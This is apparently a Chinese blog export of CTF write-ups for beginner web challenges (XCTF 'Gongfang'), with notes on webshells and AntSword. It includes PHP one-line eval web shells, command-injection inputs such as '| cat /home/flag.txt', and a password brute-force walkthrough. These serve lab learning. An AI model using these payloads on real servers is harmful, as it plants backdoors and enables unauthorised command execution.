<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSP"><figure class="iseeu highlight /jsp"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>但是用蚁剑连不上</p>
<p>最后按照传统思路，我在后面插入<code>php</code>一句话</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>好家伙，传统思路，才是真</p>
<p>连接成功拿到<code>flag</code></p>
<hr>
<p>不知道有没有看到这篇文章的同学看到这个<code>wp</code>，提醒一下，这里需要在<code>http body</code>里补充<code>num</code>请求信息</p>
<p>因为这也是绕过的一个环节</p>
<p><img src="/2022/06/26/Game-wp/image-20220921084836402.png" alt="image-20220921084836402"></p>
<hr>
<h2 id="2-UnserializeOne"><a href="#2-UnserializeOne" class="headerlink" title="2.UnserializeOne"></a>2.UnserializeOne</h2>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>疑问记录</title>
    <url>/2022/06/21/Qusetion/</url>
    <content><![CDATA[<p><u><code>以下的问题，有的已经解决，有的还存在，如果有大佬方便讲解指点，或者我的解决内容不完善或有问题，欢迎通过邮箱或QQ私信我，不胜感激</code></u></p>
<span id="more"></span>

<h2 id="1-dirsearch的原理，有没有局限？"><a href="#1-dirsearch的原理，有没有局限？" class="headerlink" title="1.dirsearch的原理，有没有局限？"></a>1.dirsearch的原理，有没有局限？</h2><p>就是一个脚本，利用字典不断向网站发出请求，在返回状态码，以确定网站下是否有对应的目录或文件</p>
<p>局限就是同一时间向网站发出大量请求，容易把对方网站搞崩或者自己ip被封，不能再访问了</p>
<h2 id="2-蚁剑的原理，连接文件后，为什么可以直接访问目录下其他文件？"><a href="#2-蚁剑的原理，连接文件后，为什么可以直接访问目录下其他文件？" class="headerlink" title="2.蚁剑的原理，连接文件后，为什么可以直接访问目录下其他文件？"></a>2.蚁剑的原理，连接文件后，为什么可以直接访问目录下其他文件？</h2><p>这里是我个人的猜想，上传shell文件后，其实可以在网页中直接利用shell读取文件内容和目录</p>
<p>这是上传了一个shell，以post方式查看phpinfo()发现成功，就是连接上了</p>
<p><img src="/2022/06/21/Qusetion/image-20220827111701261.png" alt="image-20220827111701261"></p>
<p>还可以查看根目录内容</p>
<p><img src="/2022/06/21/Qusetion/image-20220827112313891.png" alt="image-20220827112313891"></p>
<p>其他目录也可以</p>
<p><img src="/2022/06/21/Qusetion/image-20220827112544385.png" alt="image-20220827112544385"></p>
<p>并且还可以读取内容</p>
<p><img src="/2022/06/21/Qusetion/image-20220827112626617.png" alt="image-20220827112626617"></p>
<p>而蚁剑也可以实现这些功能，可能是把这些代码命令转化成图像化，方便操作</p>
<p>但是蚁剑操作更加简单一些，并且可以进行一些删除或修改的操作，虽然按上面的原理也可以实现，但明显不方便，但可以学习一一下</p>
<h2 id="3-为什么我的-htacess无法发挥作用-把其他文件解读为php-，但是还会影响它所在文件夹下的文件（php）与蚁剑连接？"><a href="#3-为什么我的-htacess无法发挥作用-把其他文件解读为php-，但是还会影响它所在文件夹下的文件（php）与蚁剑连接？" class="headerlink" title="3.为什么我的.htacess无法发挥作用(把其他文件解读为php)，但是还会影响它所在文件夹下的文件（php）与蚁剑连接？"></a>3.为什么我的.htacess无法发挥作用(把其他文件解读为php)，但是还会影响它所在文件夹下的文件（php）与蚁剑连接？</h2><p>这个问题也不能算完全解决，但是我用菜刀的时候，就可以正常使用，所以应该是蚁剑版本问题，但是蚁剑也是最新版，反正现在能用就行了</p>
<hr>
<p>现在又发现线上的利用.htacess文件的题用蚁剑也可以做，麻了</p>
<h2 id="4-什么是webshell"><a href="#4-什么是webshell" class="headerlink" title="4.什么是webshell?"></a>4.什么是webshell?</h2><h3 id="1）webshell简介"><a href="#1）webshell简介" class="headerlink" title="1）webshell简介"></a>1）webshell简介</h3><p>Webshell是通过服务器开放的端口获取服务器的某些权限。</p>
<p>webshell又称脚本木马，一般分为大马、小马、一句话木马。</p>
<p>大马，体积大、功能齐全、能够管理数据库、文件管理、对站点进行快速的信息收集，甚至能够提权。</p>
<p>小马，一般而言，我们在上传文件的时候，会被限制上传的文件大小或是拦截的情况，那么我通过小马来上传大马，实现我们想要的功能。</p>
<p>一句话木马，短小精悍、功能强大、隐蔽性好、使用客户端可以快速管理webshell。</p>
<h3 id="2）原理"><a href="#2）原理" class="headerlink" title="2）原理"></a>2）原理</h3><p>利用<u>文件上传漏洞、SQL注入漏洞、RCE漏洞</u>等，将<u>恶意文件放到web服务器</u>中，也就是常说的”<strong>后门</strong>”，之后可以<u>进行文件管理、数据库管理、远程命令执行、提权等恶意操作</u>。</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界靶场wp</title>
    <url>/2022/06/21/Gongfang-wp/</url>
    <content><![CDATA[<p><u><code>这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下</code></u></p>
<p><u><code>...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方便看看有哪些适合难度的题目做一做</code></u></p>
<span id="more"></span>

<h1 id="Web新手"><a href="#Web新手" class="headerlink" title="Web新手"></a>Web新手</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>右键不管用，直接用F12查看</p>
<p>得到flag</p>
<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧</p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p>不清楚robots协议是什么，于是我百度了一下，</p>
<p><code>robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取</code></p>
<p>也就是说网站下有一个robots.txt文件，规定了页面抓取规则，于是我们尝试访问<code>http://111.200.241.244:54251/robots.txt</code></p>
<p>界面显示如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621223828917.png" alt="image-20220621223828917"></p>
<p>disallow就是不允许抓取的页面，看到flag，就知道我们就要访问这个文件，于是访问<code>http://111.200.241.244:54251/f1ag_1s_h3re.php</code></p>
<p>得到flag</p>
<h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>看到找文件，首先我就想用dirsearch扫一扫</p>
<p>打开靶场先看到</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621224315003.png" alt="image-20220621224315003"></p>
<p>于是我先扫一扫，看一看有没有 index.php文件的文件名</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621224424076.png" alt="image-20220621224424076"></p>
<p>扫完后发现index.php.bak文件，很明显它就是备份文件，我们尝试直接访问它一下<code>http://111.200.241.244:52824/index.php.bak</code></p>
<p>自动下载好了index.php.bak，用文本打开</p>
<p>得到flag</p>
<h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><h3 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：这是夹心饼干的意思吗？</p>
<h3 id="2）wp"><a href="#2）wp" class="headerlink" title="2）wp"></a>2）wp</h3><p>我的日常随记第一章大概讲了cookie的作用和含义，该题可以不了解也可以完成</p>
<p>目前我看cookie的有两个方法，一个是burpsuite抓包看，另一个就是用火狐插件Tamper Data，这里我用brup</p>
<p>我们先用burpsuite抓一个包看看</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621225826671.png" alt="image-20220621225826671"></p>
<p>发现cookie处提示有个cookie.php文件，访问<code>http://111.200.241.244:49599/cookie.php</code>看看，如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621225920306.png" alt="image-20220621225920306"></p>
<p>于是我们把抓包数据发到repeater里看看response</p>
<p>得到flag</p>
<h2 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h2><h3 id="1-题目描述-4"><a href="#1-题目描述-4" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>该题说按这个按钮不能按，那么为什么不能按，看看源码</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220621230709669.png" alt="image-20220621230709669"></p>
<p>看到有个disabled，就是它使得按钮无法被按，所以删去就可以</p>
<p>打开开发者工具，在查看器里面，把disabled语句删去</p>
<p>按钮就可以按了，点击</p>
<p>得到flag</p>
<h2 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h2><h3 id="1-题目描述-5"><a href="#1-题目描述-5" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁写了一个登陆验证页面，随手就设了一个密码。</p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始我们先随便输入用户名和密码，弹窗显示</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220623115614924.png" alt="image-20220623115614924"></p>
<p>于是我们知道用户名是  admin，但是密码不知道，只知道是随手输入的，我们试试burp抓包看看有没有提示</p>
<p>在response里看到</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220623115811366.png" alt="image-20220623115811366"></p>
<p>这里我们就知道要用burp的密码爆破，具体操作就不细讲，随记有写</p>
<p>这是部分密码txt的网站，可以下载使用，针对不同环境，用不同密码文本</p>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
<p>最后爆出密码123456,以用户 admin输入登录</p>
<p>得到flag</p>
<h2 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h2><h3 id="1-题目描述-6"><a href="#1-题目描述-6" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>先进行代码分析</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;   <span class="keyword">echo</span> <span class="variable">$flag1</span>; </span><br><span class="line">&#125; <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(); &#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;   </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag2</span>; &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>可以看到flag被分成了两个部分，一个flag1，一个 flag2</p>
<p>a,b两个变量以get型输入</p>
<p>第一个if要求a==0且a为ture，这明显矛盾，当a=0就代表a为false</p>
<p>所以这里涉及了php性质，php属于一门弱类型语言</p>
<p><code>弱类型：不必向 PHP 声明该变量的数据类型，PHP 会根据变量的值，自动把变量转换为正确的数据类型</code></p>
<p>所以当在第一个if判断a的值时，a可以利用弱类型性质，a=0A，当进行a==0判断时，会自动把a当作数字型，也就是把a=0A后的A去掉，从而成立；</p>
<p>而当判断a是否为ture时，由于a=0A而非0，所以结果为ture，输出flag1</p>
<p><em>这里思考一下，如果是 <code>if( $a===0 and $a )&#123; echo $flag1; &#125;</code>，那按上面对a赋值还可以吗？</em></p>
<p><em>这里涉及php类型比较==与===的区别</em></p>
<ul>
<li><em>松散比较：使用两个等号 <strong>==</strong> 比较，只比较值，不比较类型。</em></li>
<li><em>严格比较：用三个等号 <strong>===</strong> 比较，除了比较值，也比较类型。</em></li>
</ul>
<p><em>上面代码中==对类型不比较，所以a=0A与0比较时，可当作a=0与0比较</em></p>
<p><em>但是当为===时，a=0A不属于数字型，所以当if(a===0)返回false，从而返回false</em></p>
<p>第二个if看到，is_numeric($b)，这里要了解一下is_numereic()函数的作用</p>
<p><code>is_numeric()函数：用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE</code></p>
<p>也就是说b的值不能为数字和数字串，但是第三个if要求b&gt;1234，所以b要为数字</p>
<p>这个和a一样，利用了php的弱类型性质，既然不能为数字，那b=1235B，这样当b与1234比较时，b转化为数字型，去掉B，1235&gt;1234成立，输出flag2</p>
<p>于是payload为</p>
<p><code>http://111.200.241.244:51156/?a=0A&amp;b=1235B</code></p>
<p>得到flag</p>
<h2 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h2><h3 id="1-题目描述-7"><a href="#1-题目描述-7" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p>
<h3 id="2）wp-1"><a href="#2）wp-1" class="headerlink" title="2）wp"></a>2）wp</h3><p>Get和Post方式是HTTP通常使用两种请求方法</p>
<p>Get方式直接在url输入?a=1</p>
<p><code>http://111.200.241.244:52081/?a=1</code></p>
<p>Post方式利用火狐插件HackerBar以post方式b=2</p>
<p>run</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624164728734.png" alt="image-20220624164728734"></p>
<p>得到flag</p>
<h2 id="9-xff-referer"><a href="#9-xff-referer" class="headerlink" title="9.xff_referer"></a>9.xff_referer</h2><h3 id="1-题目描述-8"><a href="#1-题目描述-8" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁其实xff和referer是可以伪造的</p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>先了解什么是xxf和referer</p>
<p><code>（1）X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP  代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</code></p>
<p><code>（2）HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer  是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</code></p>
<p>抓包后，发现并没有X-Forwarded-For和Referer，加上即可</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624173529705.png" alt="image-20220624173529705"></p>
<p>看题界面，提示ip必须为123.123.123.123，于是在抓包数据里加上</p>
<p><code>X-Forwarded-For： 123.123.123.123</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624174546646.png" alt="image-20220624174546646"></p>
<p>send数据后，发现response里出现以下数据，也就是说还有声明是从谷歌界面过来的</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624173805175.png" alt="image-20220624173805175"></p>
<p>也就是还要加上</p>
<p><code>Referer:  https://www.google.com</code></p>
<p>最后如下</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624174117936.png" alt="image-20220624174117936"></p>
<p>send到response后</p>
<p>得到 flag</p>
<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><h3 id="1-题目描述-9"><a href="#1-题目描述-9" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁百度了php一句话,觉着很有意思,并且把它放在index.php里</p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>看到这句代码我一下想到一句话木马，标题<a href="../../../../2022/06/21/Qusetion/">webshell</a>也提示这个木马题，根据描述我们知道这个木马在index.php里</p>
<p>不了解的可以看看这篇文章</p>
<p><a href="https://www.jianshu.com/p/6b815f951db3">php一句话木马</a></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624210259387.png" alt="image-20220624210259387"></p>
<p>用蚁剑连接即可，这里对蚁剑使用方法不赘述，建议自己操作学习</p>
<p>得到flag</p>
<h2 id="11-command-execution"><a href="#11-command-execution" class="headerlink" title="11.command_execution"></a>11.command_execution</h2><h3 id="1-题目描述-10"><a href="#1-题目描述-10" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>根据题目名知道这是命令执行漏洞的题，可以先了解一下<a href="../../../../2022/05/28/Web-study">命令执行</a>的知识</p>
<p>先用自己的IP试一下</p>
<p><code>120.0.0.1</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624213448262.png" alt="image-20220624213448262"></p>
<p>得到以下数据，由此可知我们上传的命令是<code>ping -c 3 + 输入的语句</code>，所以需要用到管道符</p>
<p>此处不止可以用 |，了解了其他管道符的作用，也可以达到相同的效果</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624215127339.png" alt="image-20220624215127339"></p>
<p>在利用管道符，在当前目录及其子目录查找有没有名为flag.txt的文件</p>
<p><code>120.0.0.1 | find  / -name flag.txt</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624215415187.png" alt="image-20220624215415187"></p>
<p>得到flag.txt的位置的绝对路径</p>
<p>输出打印flag,txt</p>
<p><code>120.0.0.1 | cat /home/flag.txt</code></p>
<p>得到flag</p>
<h2 id="12-simple-js"><a href="#12-simple-js" class="headerlink" title="12.simple_js"></a>12.simple_js</h2><h3 id="1）题目描述"><a href="#1）题目描述" class="headerlink" title="1）题目描述"></a>1）题目描述</h3><p>小宁发现了一个网页，但却一直输不对密码。</p>
<p>(Flag格式为 Cyberpeace{xxxxxxxxx} )</p>
<h3 id="2）wp-2"><a href="#2）wp-2" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题涉及代码审计，看起有点难度，但说实话大部分内容与代码审计无关，但可以分析一下</p>
<p>开始界面弹窗输入密码</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624221241740.png" alt="image-20220624221241740"></p>
<p>输入错误，提示FAUX PASSWORD HAHA</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624221310762.png" alt="image-20220624221310762"></p>
<p>我们F12把它源码拿出来分析一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        j = tab.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        k = j + (l) + (n=<span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">        n = tab2.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">    &#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">               &#123;</span></span><br><span class="line"><span class="language-javascript">                   o = tab[i-l];</span></span><br><span class="line"><span class="language-javascript">                   <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">                   p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span><br><span class="line"><span class="language-javascript">        pass = p;<span class="keyword">return</span> pass;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我们看到开头一大串代码先不着急，挨个分析</p>
<p>最显眼的就是这串16进制码</p>
<p><code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code></p>
<p>我们可以先用python 直接输出，得到10进制</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220624223640446.png" alt="image-20220624223640446"></p>
<p>这里我们把这串10进制数按ascii码转化为字符串</p>
<p>786OsErtk12</p>
<p>按描述填写 </p>
<p>得到flag : Cyberpeace{786OsErtk12}</p>
<hr>
<p>我对代码审计还不太熟悉，下面引用一篇大佬的代码审计</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="WREN"><figure class="iseeu highlight /wren"><table><tr><td class="code"><pre><span class="line">执行流程：</span><br><span class="line">一、首先定义了一个<span class="variable">dechiffre</span>函数，咱先不管，因为还没有调用</span><br><span class="line">注：先将\<span class="variable">x35</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x37</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x36</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x30</span>\<span class="variable">x37</span>\<span class="variable">x2c</span>\<span class="variable">x34</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x30</span>十六进制数转换成字符串，<span class="variable">python</span>下<span class="variable">print</span>即可，或网址：<span class="variable">https</span>:<span class="comment">//www.bejson.com/convert/ox2str/</span></span><br><span class="line">输出结果<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span></span><br><span class="line"></span><br><span class="line">二、执行<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line"></span><br><span class="line">三、调用了<span class="variable">dechiffre</span>，执行<span class="variable">dechiffre</span>函数</span><br><span class="line"><span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line">(<span class="number">1</span>)先将<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>带入<span class="variable">dechiffre</span>函数执行，即<span class="title function_">dechiffre</span>(<span class="variable">pass_enc</span>)<span class="operator">=</span><span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)接着我们看到了<span class="variable">pass</span>变量，暂时先放着</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)因为<span class="variable">pass_enc</span><span class="operator">=</span><span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50&quot;</span></span><br><span class="line">将<span class="variable">pass_enc</span>字符串分割成字符串数组，赋值给<span class="variable">tab</span>参数，所以：</span><br><span class="line"><span class="variable">tab</span><span class="operator">=</span>[<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]   注：<span class="variable">tab</span>此时是字符串数组！！！</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)随后也对<span class="variable">pass</span>分割</span><br><span class="line"><span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span 